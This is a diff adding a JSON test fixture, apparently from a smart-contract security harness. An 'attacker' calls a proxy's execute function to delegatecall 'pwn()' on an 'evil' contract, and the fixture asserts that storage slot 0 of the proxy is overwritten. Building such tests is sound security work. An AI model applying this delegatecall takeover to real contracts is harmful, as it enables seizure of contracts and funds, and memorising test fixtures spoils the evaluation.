@@ -1,0 +1,40 @@
+{
+    "attempt_id": "attempt_delegatecall",
+    "setup": {
+        "deployments": {
+            "target": {
+                "file": "DelegateProxy.sol",
+                "contract": "DelegateProxy",
+                "args": []
+            },
+            "evil": {
+                "file": "DelegateEvil.sol",
+                "contract": "DelegateEvil",
+                "args": []
+            }
+        }
+    },
+    "prestate": {
+        "deals": []
+    },
+    "calls": [
+        {
+            "contract": "target",
+            "function": "execute",
+            "args": [
+                "address(evil)",
+                "abi.encodeWithSignature('pwn()')"
+            ],
+            "from": "attacker",
+            "value": "0"
+        }
+    ],
+    "assertions": [
+        {
+            "type": "storage_eq",
+            "target": "target",
+            "slot": "0",
+            "value": "0x0000000000000000000000000000000000000123"
+        }
+    ]
+}
